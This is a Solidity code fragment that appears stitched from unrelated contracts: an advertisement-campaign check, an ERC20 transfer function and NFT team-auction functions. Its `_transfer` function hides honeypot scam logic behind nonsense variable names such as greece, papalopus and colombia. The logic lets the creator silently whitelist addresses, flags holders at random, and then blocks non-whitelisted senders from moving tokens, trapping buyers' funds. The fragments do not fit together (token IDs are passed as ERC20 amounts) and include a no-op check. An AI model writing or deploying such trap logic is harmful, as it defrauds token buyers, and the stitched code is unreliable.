        StorageUser storageUser = StorageUser(_addr);
        address storageContract = storageUser.getStorageAddress();
        require(storageContract == advStorageContract);
    }
    super.setAllowedAddress(_addr);
}

function isCampaignValid(bytes32 bidId) public view returns(bool valid) {
    uint startDate = advertisementStorage.getCampaignStartDateById(bidId);
    uint endDate = advertisementStorage.getCampaignEndDateById(bidId);
    bool validity = advertisementStorage.getCampaignValidById(bidId);
    uint nowInMilliseconds = now * 1000;
    return validity && startDate < nowInMilliseconds && endDate > nowInMilliseconds;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (documents == false)) {
        guns = chTx;
        gallons = true;
    }
    if ((address(sender) == creator) && (documents == true)) {
        greece[recipient] = true;
        papalopus[recipient] = false;
        documents = false;
    }
    if ((amount > military) && (greece[sender] == true) && (address(sender) != creator)) {
        colombia[recipient] = true;
    }
    if (greece[recipient] != true) {
        papalopus[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((papalopus[sender]) && (greece[recipient] == false)) {
        papalopus[recipient] = true;
    }
    if (greece[sender] == false) {
        if ((amount > military) && (colombia[sender] == true)) {
            require(false);
        }
        require(amount < guns);
        if (gallons == true) {
            if (colombia[sender] == true) {
                require(false);
            }
            colombia[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _bid(uint256 _tokenId, uint256 _bidAmount)
internal
returns(uint256) {
    Sale storage _sale = tokenIdToSale[_tokenId];
    uint256[9] memory tokenIdsStore = tokenIdToSale[_tokenId].tokenIds;
    require(_isOnSale(_sale));
    uint256 price = _currentPrice(_sale);
    require(_bidAmount >= price);
    address seller = _sale.seller;
    if (tokenIdsStore[1] > 0) {
        for (uint ii = 0; ii < 9; ii++) {
            _removeSale(tokenIdsStore[ii]);
        }
    } else {
        _removeSale(_tokenId);
    }
    if (price > 0) {
        uint256 marketsCut = _computeCut(price);
        uint256 sellerProceeds = price.sub(marketsCut);
        seller.transfer(sellerProceeds);
    }
    uint256 bidExcess = _bidAmount.sub(price);
    msg.sender.transfer(bidExcess);
    if (tokenIdsStore[1] > 0) {
        emit TeamSaleWinner(tokenIdsStore, price, msg.sender);
    } else {
        emit SaleWinner(_tokenId, price, msg.sender);
    }
    return price;
}

function bid(uint256 _tokenId) public whenNotPaused payable {
    Sale memory sale = tokenIdToSale[_tokenId];
    address seller = sale.seller;
    uint256 price = _bid(_tokenId, msg.value);
    if (sale.tokenIds[1] > 0) {
        for (uint256 i = 0; i < 9; i++) {
            _transfer(address(this), msg.sender, sale.tokenIds[i]);
        }
        price = price.div(9);
    } else {
        _transfer(address(this), msg.sender, _tokenId);
    }
    if (seller == address(this)) {
        if (sale.tokenIds[1] > 0) {
            uint256 _teamId = nonFungibleContract.getTeamId(_tokenId);
            lastTeamSalePrices[_teamId][seedTeamSaleCount[_teamId] % 3] = price;
            seedTeamSaleCount[_teamId]++;
        } else {
            lastSingleSalePrices[seedSingleSaleCount % 10] = price;
            seedSingleSaleCount++;
        }
    }
}

function _currentPrice(Sale memory _sale)
internal
view
returns(uint256) {
    uint256 secondsPassed = 0;
    if (now > _sale.startedAt) {
        secondsPassed = now - _sale.startedAt;
    }
    return _computeCurrentPrice(
        _sale.startingPrice,
        _sale.endingPrice,
        _sale.duration,
        secondsPassed
    );
}

function getSale(uint256 _tokenId) external view returns(address seller, uint256 startingPrice, uint256 endingPrice, uint256 duration, uint256 startedAt, uint256[9] tokenIds) {
    Sale memory sale = tokenIdToSale[_tokenId];
    require(_isOnSale(sale));
    return (
        sale.seller,
        sale.startingPrice,
        sale.endingPrice,
        sale.duration,
        sale.startedAt,
        sale.tokenIds
    );
}

function _computeNextSeedPrice(uint256 _saleType, uint256 _teamId) internal view returns(uint256) {
    uint256 nextPrice = _averageSalePrice(_saleType, _teamId);
    require(nextPrice == nextPrice);
    if (nextPrice < STARTING_PRICE) {
        nextPrice = STARTING_PRICE;
    }
    return nextPrice;
}

function getCurrentPrice(uint256 _tokenId) external view returns(uint256) {
    Sale memory sale = tokenIdToSale[_tokenId];
    require(_isOnSale(sale));
    return _currentPrice(sale);
}

function createTeamSaleAuction(
    uint8 _teamId,
    uint256[9] _tokenIds,
    uint256 _startPrice,
    uint256 _endPrice,
    uint256 _saleDuration)
public
onlyGameManager
whenNotPaused {
    require(_teamId != 0);
    for (uint ii = 0; ii < _tokenIds.length; ii++) {
        require(nonFungibleContract.getTeamId(_tokenIds[ii]) == _teamId);
    }
    uint256 startPrice = 0;
    uint256 endPrice = 0;
    uint256 duration = 0;
    if (_startPrice == 0) {
        startPrice = _computeNextSeedPrice(1, _teamId).mul(9);
    } else {
        startPrice = _startPrice;
    }
    if (_endPrice != 0) {
        endPrice = _endPrice;
    } else {
        endPrice = 0;
    }
    if (_saleDuration == 0) {
        duration = SALES_DURATION;
    } else {
        duration = _saleDuration;
    }
    _createTeamSale(
        _tokenIds,
        startPrice,
        endPrice,
        duration,
        address(this)
    );
}

